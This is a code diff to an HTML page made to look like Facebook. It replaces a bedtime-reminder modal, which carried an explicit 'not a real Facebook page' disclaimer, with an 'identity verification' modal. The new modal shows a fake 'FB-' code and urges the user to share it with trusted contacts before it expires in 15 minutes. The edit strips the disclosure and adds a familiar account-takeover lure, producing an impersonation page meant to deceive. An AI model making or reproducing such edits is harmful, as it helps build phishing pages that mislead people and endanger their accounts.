@@ -271,12 +271,12 @@
     
     .modal-content {
       background-color: white;
-      padding: 1.5rem;
+      padding: 2rem;
       border-radius: 8px;
-      max-width: 400px;
+      max-width: 450px;
       width: 100%;
       text-align: center;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
       transform: translateY(20px);
       transition: transform 0.3s ease;
     }
@@ -290,11 +290,13 @@
       color: white;
       border: none;
       border-radius: 6px;
-      padding: 0.75rem 1rem;
+      padding: 0.9rem 1.5rem;
       font-size: 1rem;
       font-weight: bold;
       cursor: pointer;
       transition: background-color 0.2s ease;
+      min-width: 180px;
+      margin-top: 10px;
     }
     
     .modal-close-button:hover {
@@ -414,22 +416,30 @@
     </div>
   </div>
   
-  <!-- Bedtime Modal -->
+  <!-- Confirmation Modal -->
   <div class="bedtime-modal" id="bedtime-modal">
-    <div class="modal-content p-4">
-      <div>
+    <div class="modal-content">
+      <div style="text-align: center;">
         <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#1877F2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin: 0 auto 1rem;">
-          <path d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path>
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+          <polyline points="22 4 12 14.01 9 11.01"></polyline>
         </svg>
-        <h2 class="text-2xl font-bold mb-2 text-facebook-blue">It's Bedtime!</h2>
-        <p class="mb-4">
-          Time to put away the phone and get some rest. Sweet dreams!
+        <h2 class="text-2xl font-bold mb-3 text-facebook-blue">You're almost done</h2>
+        <p class="mb-4" style="font-size: 16px; line-height: 1.4;">
+          We've sent you a confirmation code. Share this code with one of your trusted contacts to help complete your identity verification.
         </p>
+        
+        <!-- Confirmation code box -->
+        <div style="margin: 20px auto; padding: 15px; background-color: #f0f2f5; border-radius: 8px; width: 230px; font-size: 24px; font-weight: bold; letter-spacing: 2px; color: #1877F2;">
+          FB-<script>document.write(Math.floor(100000 + Math.random() * 900000))</script>
+        </div>
+        
         <p class="text-facebook-text-light text-sm mb-6">
-          This is not a real Facebook page. It's just a reminder that it's time for bed.
+          This code will expire in 15 minutes for security purposes.
         </p>
-        <a href="https://www.facebook.com" class="modal-close-button" id="modal-close-button" style="display: inline-block; text-decoration: none;">
-          Return to Facebook
+        
+        <a href="https://www.facebook.com" class="modal-close-button" id="modal-close-button" style="display: inline-block; text-decoration: none; margin-top: 10px;">
+          Continue to Facebook
         </a>
       </div>
     </div>
